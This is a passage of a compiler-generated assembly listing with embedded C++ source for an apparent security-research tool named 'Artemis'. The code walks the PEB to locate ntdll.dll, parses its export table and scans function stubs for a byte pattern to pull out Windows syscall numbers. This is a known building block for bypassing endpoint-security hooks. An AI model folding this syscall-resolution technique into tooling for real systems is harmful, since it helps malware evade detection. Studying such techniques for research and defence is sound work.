	mov	rax, QWORD PTR this$[rsp]
	mov	DWORD PTR [rax], 1024			; 00000400H
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 56					; 00000038H
	mov	rcx, rax
	call	??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0Artemis@@QEAA@XZ ENDP				; Artemis::Artemis
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\artemis.cpp
;	COMDAT ?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
syscallID$ = 32
$T1 = 36
$T2 = 40
tv95 = 48
$T3 = 56
tv129 = 64
$T4 = 72
$T5 = 104
fileName$ = 136
__$ArrayPad$ = 168
this$ = 192
targetFunction$ = 200
?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; Artemis::controller, COMDAT

; 175  :     int controller(std::string targetFunction) {

$LN7:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 184				; 000000b8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 176  : 
; 177  : 
; 178  :         std::wstring fileName = L"ntdll.dll";   // wide string utf-16 name

	lea	rdx, OFFSET FLAT:??_C@_1BE@GJOFHIHD@?$AAn?$AAt?$AAd?$AAl?$AAl?$AA?4?$AAd?$AAl?$AAl@
	lea	rcx, QWORD PTR fileName$[rsp]
	call	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	npad	1

; 179  : 
; 180  :         walkPEB(fileName);

	lea	rax, QWORD PTR $T4[rsp]
	mov	QWORD PTR $T2[rsp], rax
	lea	rdx, QWORD PTR fileName$[rsp]
	mov	rcx, QWORD PTR $T2[rsp]
	call	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	mov	QWORD PTR tv95[rsp], rax
	mov	rdx, QWORD PTR tv95[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; Artemis::walkPEB

; 181  :         int syscallID = walkPE(targetFunction);

	lea	rax, QWORD PTR $T5[rsp]
	mov	QWORD PTR $T3[rsp], rax
	mov	rdx, QWORD PTR targetFunction$[rsp]
	mov	rcx, QWORD PTR $T3[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	QWORD PTR tv129[rsp], rax
	mov	rdx, QWORD PTR tv129[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; Artemis::walkPE
	mov	DWORD PTR syscallID$[rsp], eax

; 182  : 
; 183  :         return syscallID;

	mov	eax, DWORD PTR syscallID$[rsp]
	mov	DWORD PTR $T1[rsp], eax
	lea	rcx, QWORD PTR fileName$[rsp]
	call	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	npad	1
	mov	rcx, QWORD PTR targetFunction$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T1[rsp]

; 184  : 
; 185  :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 184				; 000000b8H
	ret	0
?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; Artemis::controller
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
syscallID$ = 32
$T1 = 36
$T2 = 40
tv95 = 48
$T3 = 56
tv129 = 64
$T4 = 72
$T5 = 104
fileName$ = 136
__$ArrayPad$ = 168
this$ = 192
targetFunction$ = 200
?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `Artemis::controller'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR targetFunction$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `Artemis::controller'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
syscallID$ = 32
$T1 = 36
$T2 = 40
tv95 = 48
$T3 = 56
tv129 = 64
$T4 = 72
$T5 = 104
fileName$ = 136
__$ArrayPad$ = 168
this$ = 192
targetFunction$ = 200
?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `Artemis::controller'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR fileName$[rbp]
	call	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `Artemis::controller'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\artemis.cpp
;	COMDAT ?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 36
i$ = 40
unicodeArrayPtr$ = 48
tv79 = 56
tv82 = 64
unicodeArray$ = 72
$T3 = 96
$T4 = 104
unicodeString$ = 112
__$ArrayPad$ = 144
this$ = 176
__$ReturnUdt$ = 184
unicodeArrayPtrValue$ = 192
?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z PROC ; Artemis::readUnicodeArrayFrom64BitPointer, COMDAT

; 158  :     std::wstring readUnicodeArrayFrom64BitPointer(const uint64_t unicodeArrayPtrValue) {

$LN9:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 168				; 000000a8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	DWORD PTR $T2[rsp], 0

; 159  :         // Convert the 64-bit pointer to a wchar_t* (Unicode character pointer)
; 160  :         const wchar_t* unicodeArrayPtr = reinterpret_cast<const wchar_t*>(static_cast<uintptr_t>(unicodeArrayPtrValue));

	mov	rax, QWORD PTR unicodeArrayPtrValue$[rsp]
	mov	QWORD PTR unicodeArrayPtr$[rsp], rax

; 161  : 
; 162  :         // Collect the Unicode characters until we encounter a null-terminator (end of the string)
; 163  :         std::vector<wchar_t> unicodeArray;

	lea	rcx, QWORD PTR unicodeArray$[rsp]
	call	??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::vector<wchar_t,std::allocator<wchar_t> >
	npad	1

; 164  :         size_t i = 0;

	mov	QWORD PTR i$[rsp], 0
$LN2@readUnicod:

; 165  :         while (unicodeArrayPtr[i] != L'\0') {

	mov	rax, QWORD PTR unicodeArrayPtr$[rsp]
	mov	rcx, QWORD PTR i$[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	SHORT $LN3@readUnicod

; 166  :             unicodeArray.push_back(unicodeArrayPtr[i]);

	mov	rax, QWORD PTR unicodeArrayPtr$[rsp]
	mov	rcx, QWORD PTR i$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	rdx, rax
	lea	rcx, QWORD PTR unicodeArray$[rsp]
	call	?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::push_back

; 167  :             i++;

	mov	rax, QWORD PTR i$[rsp]
	inc	rax
	mov	QWORD PTR i$[rsp], rax

; 168  :         }

	jmp	SHORT $LN2@readUnicod
$LN3@readUnicod:

; 169  : 
; 170  :         std::wstring unicodeString(unicodeArray.begin(), unicodeArray.end());

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$allocator@_W@std@@QEAA@XZ		; std::allocator<wchar_t>::allocator<wchar_t>
	mov	QWORD PTR tv79[rsp], rax
	lea	rdx, QWORD PTR $T3[rsp]
	lea	rcx, QWORD PTR unicodeArray$[rsp]
	call	?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::end
	mov	QWORD PTR tv82[rsp], rax
	lea	rdx, QWORD PTR $T4[rsp]
	lea	rcx, QWORD PTR unicodeArray$[rsp]
	call	?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::begin
	mov	rcx, QWORD PTR tv79[rsp]
	mov	r9, rcx
	mov	rcx, QWORD PTR tv82[rsp]
	mov	r8, QWORD PTR [rcx]
	mov	rdx, QWORD PTR [rax]
	lea	rcx, QWORD PTR unicodeString$[rsp]
	call	??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,0>

; 171  : 
; 172  :         return unicodeString;

	lea	rdx, QWORD PTR unicodeString$[rsp]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	mov	eax, DWORD PTR $T2[rsp]
	or	eax, 1
	mov	DWORD PTR $T2[rsp], eax
	lea	rcx, QWORD PTR unicodeString$[rsp]
	call	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
	npad	1
	lea	rcx, QWORD PTR unicodeArray$[rsp]
	call	??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 173  :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 168				; 000000a8H
	ret	0
?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z ENDP ; Artemis::readUnicodeArrayFrom64BitPointer
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 36
i$ = 40
unicodeArrayPtr$ = 48
tv79 = 56
tv82 = 64
unicodeArray$ = 72
$T3 = 96
$T4 = 104
unicodeString$ = 112
__$ArrayPad$ = 144
this$ = 176
__$ReturnUdt$ = 184
unicodeArrayPtrValue$ = 192
?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA PROC ; `Artemis::readUnicodeArrayFrom64BitPointer'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR unicodeArray$[rbp]
	call	??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z@4HA ENDP ; `Artemis::readUnicodeArrayFrom64BitPointer'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\artemis.cpp
;	COMDAT ?syscallExtractor@Artemis@@QEAAH_K@Z
_TEXT	SEGMENT
tick$ = 32
syscallID$ = 36
$T1 = 40
assembly$2 = 48
window$3 = 56
egg$ = 64
lens$ = 72
this$ = 112
functionPtr$ = 120
?syscallExtractor@Artemis@@QEAAH_K@Z PROC		; Artemis::syscallExtractor, COMDAT

; 125  :     int syscallExtractor(UINT64 functionPtr) {

$LN8:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 126  : 
; 127  :         int syscallID;
; 128  :         UINT64 egg = 0x4c8bd1b8;

	mov	QWORD PTR egg$[rsp], 1284231608		; 4c8bd1b8H

; 129  :         std::vector<BYTE> lens;

	lea	rcx, QWORD PTR lens$[rsp]
	call	??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::vector<unsigned char,std::allocator<unsigned char> >
	npad	1

; 130  : 
; 131  :         int tick = 0x0;

	mov	DWORD PTR tick$[rsp], 0
$LN2@syscallExt:

; 132  :         while(true) {

	xor	eax, eax
	cmp	eax, 1
	je	$LN3@syscallExt

; 133  : 
; 134  :             BYTE* assembly = (BYTE*)functionPtr + tick;

	movsxd	rax, DWORD PTR tick$[rsp]
	mov	rcx, QWORD PTR functionPtr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR assembly$2[rsp], rax

; 135  :             if(*assembly == 0x4c) {

	mov	rax, QWORD PTR assembly$2[rsp]
	movzx	eax, BYTE PTR [rax]
	cmp	eax, 76					; 0000004cH
	jne	SHORT $LN4@syscallExt

; 136  :                  lens.push_back(*assembly);

	mov	rdx, QWORD PTR assembly$2[rsp]
	lea	rcx, QWORD PTR lens$[rsp]
	call	?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::push_back

; 137  :                  UINT32* window = (UINT32*)assembly;

	mov	rax, QWORD PTR assembly$2[rsp]
	mov	QWORD PTR window$3[rsp], rax

; 138  :                  printf("\nEgg: %p", egg);

	mov	rdx, QWORD PTR egg$[rsp]
	lea	rcx, OFFSET FLAT:??_C@_08OMFPBCCL@?6Egg?3?5?$CFp@
	call	printf

; 139  :                  printf("\nWindow: %p", *window);

	mov	rax, QWORD PTR window$3[rsp]
	mov	edx, DWORD PTR [rax]
	lea	rcx, OFFSET FLAT:??_C@_0M@ODKJDBAK@?6Window?3?5?$CFp@
	call	printf

; 140  :                  if(_byteswap_ulong(*window) == egg) {

	mov	rax, QWORD PTR window$3[rsp]
	mov	ecx, DWORD PTR [rax]
	call	_byteswap_ulong
	mov	eax, eax
	cmp	rax, QWORD PTR egg$[rsp]
	jne	SHORT $LN4@syscallExt

; 141  :                     printf("\nFound Egg! Grabbing Syscall Id..");

	lea	rcx, OFFSET FLAT:??_C@_0CC@GDLBNECE@?6Found?5Egg?$CB?5Grabbing?5Syscall?5Id@
	call	printf

; 142  :                     syscallID = *((BYTE*)(window+0x1)); // Go plus 0x1 from the end of the window to snag the syscall ID value

	mov	rax, QWORD PTR window$3[rsp]
	movzx	eax, BYTE PTR [rax+4]
	mov	DWORD PTR syscallID$[rsp], eax

; 143  :                     printf("\n[+] Syscall Id: %x", syscallID);  // print Hex value

	mov	edx, DWORD PTR syscallID$[rsp]
	lea	rcx, OFFSET FLAT:??_C@_0BE@PGDPLDOM@?6?$FL?$CL?$FN?5Syscall?5Id?3?5?$CFx@
	call	printf

; 144  :                     break;

	jmp	SHORT $LN3@syscallExt
$LN4@syscallExt:

; 145  :                  }
; 146  :             }
; 147  : 
; 148  :             printf("\nAssembly: %p", *assembly);

	mov	rax, QWORD PTR assembly$2[rsp]
	movzx	eax, BYTE PTR [rax]
	mov	edx, eax
	lea	rcx, OFFSET FLAT:??_C@_0O@JKHBPFAG@?6Assembly?3?5?$CFp@
	call	printf

; 149  : 
; 150  :             tick++;

	mov	eax, DWORD PTR tick$[rsp]
	inc	eax
	mov	DWORD PTR tick$[rsp], eax

; 151  : 
; 152  :         }

	jmp	$LN2@syscallExt
$LN3@syscallExt:

; 153  :         
; 154  :         return syscallID;

	mov	eax, DWORD PTR syscallID$[rsp]
	mov	DWORD PTR $T1[rsp], eax
	lea	rcx, QWORD PTR lens$[rsp]
	call	??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::~vector<unsigned char,std::allocator<unsigned char> >
	mov	eax, DWORD PTR $T1[rsp]

; 155  :     }

	add	rsp, 104				; 00000068H
	ret	0
?syscallExtractor@Artemis@@QEAAH_K@Z ENDP		; Artemis::syscallExtractor
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tick$ = 32
syscallID$ = 36
$T1 = 40
assembly$2 = 48
window$3 = 56
egg$ = 64
lens$ = 72
this$ = 112
functionPtr$ = 120
?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA PROC ; `Artemis::syscallExtractor'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR lens$[rbp]
	call	??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::~vector<unsigned char,std::allocator<unsigned char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??syscallExtractor@Artemis@@QEAAH_K@Z@4HA ENDP ; `Artemis::syscallExtractor'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\artemis.cpp
;	COMDAT ?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
functionNameChar$1 = 32
i$2 = 36
funcTick$ = 40
tick$ = 44
syscallID$3 = 48
$T4 = 52
funcAddress$5 = 56
exportDirectoryRVA$ = 64
functionNameArray$ = 72
tv168 = 96
exportNamesDirectoryRVA$ = 104
functionName$ = 112
__$ArrayPad$ = 144
this$ = 176
targetFunction$ = 184
?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; Artemis::walkPE, COMDAT

; 68   :     int walkPE(std::string targetFunction) {

$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 168				; 000000a8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 69   : 
; 70   :         peHeaderStruct.e_lfanew = *((BYTE*)ldrEntryStruct.EntryPoint+0x3C); // Not necessary for this project, but still useful to store for flexibility

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+112]
	mov	rcx, QWORD PTR this$[rsp]
	movzx	eax, BYTE PTR [rax+60]
	mov	BYTE PTR [rcx+232], al

; 71   :         peHeaderStruct.ImageBase = *(UINT64*)((BYTE*)ldrEntryStruct.EntryPoint+0x118);  // Base of NTDLL.DLL

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+112]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+280]
	mov	QWORD PTR [rcx+240], rax

; 72   :         printf("\nImage Base: %p", peHeaderStruct.ImageBase);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+240]
	lea	rcx, OFFSET FLAT:??_C@_0BA@LCKOAPAP@?6Image?5Base?3?5?$CFp@
	call	printf

; 73   : 
; 74   :         UINT64 exportDirectoryRVA = *(UINT32*)((BYTE*)ldrEntryStruct.EntryPoint+0x170);    // Export Dir RVA Offset

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+112]
	mov	eax, DWORD PTR [rax+368]
	mov	QWORD PTR exportDirectoryRVA$[rsp], rax

; 75   :         exportDirectoryStruct.AddressOfFunctions = peHeaderStruct.ImageBase + *((UINT32*)((peHeaderStruct.ImageBase + exportDirectoryRVA) + 0x1C)); // This finds the AddressOfFunctions Offset and then dereferences to get the RVA address of actual table location

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+240]
	mov	rcx, QWORD PTR exportDirectoryRVA$[rsp]
	mov	eax, DWORD PTR [rax+rcx+28]
	mov	rcx, QWORD PTR this$[rsp]
	add	rax, QWORD PTR [rcx+240]
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+248], rax

; 76   :         printf("\nExport Functions Directory Ptr: %p", exportDirectoryStruct.AddressOfFunctions);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+248]
	lea	rcx, OFFSET FLAT:??_C@_0CE@LGEJMOEH@?6Export?5Functions?5Directory?5Ptr@
	call	printf

; 77   : 
; 78   :         UINT64 exportNamesDirectoryRVA = *(UINT32*)((BYTE*)ldrEntryStruct.EntryPoint+0x174);    // Export Names Dir RVA Offset

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+112]
	mov	eax, DWORD PTR [rax+372]
	mov	QWORD PTR exportNamesDirectoryRVA$[rsp], rax

; 79   :         exportDirectoryStruct.AddressOfNames = peHeaderStruct.ImageBase + *((UINT32*)((peHeaderStruct.ImageBase + exportDirectoryRVA) + 0x20));

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+240]
	mov	rcx, QWORD PTR exportDirectoryRVA$[rsp]
	mov	eax, DWORD PTR [rax+rcx+32]
	mov	rcx, QWORD PTR this$[rsp]
	add	rax, QWORD PTR [rcx+240]
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+256], rax

; 80   :         printf("\nExport Names Directory Ptr: %p", exportDirectoryStruct.AddressOfNames);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+256]
	lea	rcx, OFFSET FLAT:??_C@_0CA@MBJLGEGM@?6Export?5Names?5Directory?5Ptr?3?5?$CFp@
	call	printf

; 81   : 
; 82   :         int tick = 0x0; // Incrementor for BYTE stepping in memory

	mov	DWORD PTR tick$[rsp], 0

; 83   :         int funcTick = 1;   // Tracks function numbers, so we can correlate back to Function Address Table -- Starting at 1 due to first function RVA not having any associated name

	mov	DWORD PTR funcTick$[rsp], 1

; 84   :         std::string functionName;

	lea	rcx, QWORD PTR functionName$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1

; 85   :         std::vector<char> functionNameArray;

	lea	rcx, QWORD PTR functionNameArray$[rsp]
	call	??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ ; std::vector<char,std::allocator<char> >::vector<char,std::allocator<char> >
	npad	1
$LN2@walkPE:

; 86   :         while(true) {   // Loop through function and function name Export Tables till we find our match

	xor	eax, eax
	cmp	eax, 1
	je	$LN3@walkPE

; 87   : 
; 88   :             char functionNameChar = *(BYTE*)(peHeaderStruct.ImageBase + *((UINT32*)exportDirectoryStruct.AddressOfNames)+tick);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+256]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	add	rax, QWORD PTR [rcx+240]
	movsxd	rcx, DWORD PTR tick$[rsp]
	movzx	eax, BYTE PTR [rax+rcx]
	mov	BYTE PTR functionNameChar$1[rsp], al

; 89   :             functionNameArray.push_back(functionNameChar);

	lea	rdx, QWORD PTR functionNameChar$1[rsp]
	lea	rcx, QWORD PTR functionNameArray$[rsp]
	call	?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z ; std::vector<char,std::allocator<char> >::push_back

; 90   :             if(functionNameChar == '\0') {  // Check for end of function name string

	movsx	eax, BYTE PTR functionNameChar$1[rsp]
	test	eax, eax
	jne	$LN7@walkPE

; 91   : 
; 92   :                 for(unsigned int i = 0; i < functionNameArray.size(); i++) {

	mov	DWORD PTR i$2[rsp], 0
	jmp	SHORT $LN6@walkPE
$LN4@walkPE:
	mov	eax, DWORD PTR i$2[rsp]
	inc	eax
	mov	DWORD PTR i$2[rsp], eax
$LN6@walkPE:
	mov	eax, DWORD PTR i$2[rsp]
	mov	QWORD PTR tv168[rsp], rax
	lea	rcx, QWORD PTR functionNameArray$[rsp]
	call	?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ; std::vector<char,std::allocator<char> >::size
	mov	rcx, QWORD PTR tv168[rsp]
	cmp	rcx, rax
	jae	SHORT $LN5@walkPE

; 93   :                     functionName += functionNameArray[i];

	mov	eax, DWORD PTR i$2[rsp]
	mov	edx, eax
	lea	rcx, QWORD PTR functionNameArray$[rsp]
	call	??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z ; std::vector<char,std::allocator<char> >::operator[]
	movzx	edx, BYTE PTR [rax]
	lea	rcx, QWORD PTR functionName$[rsp]
	call	??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=

; 94   :                 }

	jmp	SHORT $LN4@walkPE
$LN5@walkPE:

; 95   :                 
; 96   :                 if(functionName.find(targetFunction) != std::string::npos) {  // If target function is found

	xor	r8d, r8d
	mov	rdx, QWORD PTR targetFunction$[rsp]
	lea	rcx, QWORD PTR functionName$[rsp]
	call	?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::find
	cmp	rax, -1
	je	$LN8@walkPE

; 97   :                     printf("\nFunction Found!: %s", functionName.c_str());

	lea	rcx, QWORD PTR functionName$[rsp]
	call	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
	mov	rdx, rax
	lea	rcx, OFFSET FLAT:??_C@_0BF@PMMHMJLI@?6Function?5Found?$CB?3?5?$CFs@
	call	printf

; 98   : 
; 99   :                     // Now we correlate back to the Export Functions Directory to get Function PTR, so we can start stepping through function's code
; 100  :                     UINT64 funcAddress = peHeaderStruct.ImageBase + *(((UINT32*)exportDirectoryStruct.AddressOfFunctions) + funcTick);

	movsxd	rax, DWORD PTR funcTick$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+248]
	mov	eax, DWORD PTR [rcx+rax*4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rax, QWORD PTR [rcx+240]
	mov	QWORD PTR funcAddress$5[rsp], rax

; 101  :                     printf("\nFunction Addr Ptr: %p", funcAddress);

	mov	rdx, QWORD PTR funcAddress$5[rsp]
	lea	rcx, OFFSET FLAT:??_C@_0BH@MOIEDGH@?6Function?5Addr?5Ptr?3?5?$CFp@
